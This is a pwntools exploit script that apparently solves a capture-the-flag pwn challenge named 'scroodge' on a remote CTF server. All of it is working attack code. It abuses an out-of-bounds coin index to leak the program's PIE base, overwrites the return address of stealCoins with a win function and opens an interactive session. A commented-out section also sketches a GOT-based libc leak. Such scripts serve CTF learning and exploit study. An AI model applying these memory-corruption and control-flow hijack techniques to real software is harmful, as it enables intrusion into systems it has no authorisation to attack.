from pwn import *
from time import *
#io = process("./scroodge")
io = remote("chall.polygl0ts.ch",12018)

def tohex(val, nbits):
    return hex((val + (1 << nbits)) % (1 << nbits))

def steal_coins(duck_id,coin_id,pouch_id,to_copy,id_or_value):
    io.sendlineafter(b"1. Steal coins",b"1")
    io.sendlineafter(b"Enter the duck you want to steal coins for",str(duck_id+1).encode())
    io.sendlineafter(b"Enter the index of the coin you want to steal [0-9]:",str(coin_id).encode())
    io.sendlineafter(b"duck's coin pouch",str(pouch_id).encode())
    io.sendlineafter(b"Do you want the fake coin to take a value from the coin pouch",to_copy.encode())

    if to_copy == "y":
        io.sendlineafter(b"Which value from the coin pouch do you want to use",str(id_or_value).encode())
        
    elif to_copy == "n":
        io.sendlineafter(b"Enter the value you want the fake coin to have:",str(id_or_value).encode())

def resteal_coins(duck_id,coin_id,new_ptr):
    io.sendlineafter(b"1. Steal coins",b"1")
    io.sendlineafter(b"Enter the duck you want to steal coins for",str(duck_id+1).encode())
    io.sendlineafter(b"Enter the index of the coin you want to steal [0-9]:",str(coin_id).encode())
    io.recvuntil(b"holds value ")
    ret = int(io.recvuntil(b":")[:-1],16)

    if new_ptr == 0:
        new_ptr = ret # don't change it

    io.sendlineafter(b"Enter the value you want the fake coin to have:",hex(new_ptr).encode())
    return ret

def view_coins(coin_id):
    io.sendlineafter(b"1. Steal coins",b"2")
    io.recvuntil(b"Coins present in the vault:")
    io.recvuntil(str(coin_id).encode() + b": ")
    return int(io.recvuntil(b"C")[:-2])


steal_coins(0,0,0,"y",-1)
pie_leak_p1 = view_coins(0) - 0x2342
pie_leak_p2 = resteal_coins(0,0,0) >> 32
pie_base = (pie_leak_p2 << 32) + pie_leak_p1
log.info("PIE BASE: " + hex(pie_base))

win = pie_base + 0x1798 # nice trick by itay!

#putchar_got = pie_base + 0x3f80 
#resteal_coins(0,0,putchar_got) # now index 0 coin points to unwritable memory
#sleep(0.5)
#leak_p1 = view_coins(0)
#
#steal_coins(0,1,1,"n",123)
#resteal_coins(0,1,putchar_got+4)
#sleep(0.5)
#leak_p2 = view_coins(1)
#
#libc_leak = (leak_p2<<32) + leak_p1
#log.info("LIBC BASE: " + hex(libc_leak))

# put win function into vault and overwrite ret address of stealCoins
resteal_coins(0,0,win)
#gdb.attach(io,gdbscript="break *(stealCoins+172)")
steal_coins(0,0,-54,"n",123)

io.interactive()

